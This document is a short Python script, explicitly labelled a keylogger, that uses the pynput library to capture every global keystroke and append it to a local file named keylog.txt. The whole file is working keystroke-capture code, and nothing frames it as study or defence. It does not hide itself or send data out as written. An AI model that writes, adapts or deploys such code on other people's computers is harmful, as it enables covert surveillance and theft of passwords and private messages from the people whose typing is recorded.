from pynput.keyboard import Key, Listener

# Specify the file where you want to log the keys
log_file = "keylog.txt"

# Function to write keys to the log file
def write_to_file(key):
    key_data = str(key).replace("'", "")
    
    # Handle special keys (like space, enter, backspace) for readability
    if key == Key.space:
        key_data = ' '
    elif key == Key.enter:
        key_data = '\n'
    elif key == Key.backspace:
        key_data = '[BACKSPACE]'
    elif key == Key.tab:
        key_data = '[TAB]'
    elif key == Key.shift:
        key_data = '[SHIFT]'
    elif key == Key.esc:
        key_data = '[ESC]'

    # Append the key data to the file
    with open(log_file, 'a') as f:
        f.write(key_data)

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Function to handle key release events
def on_release(key):
    # Stop the keylogger if ESC is pressed
    if key == Key.esc:
        return False

# Start the listener for global keylogging
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
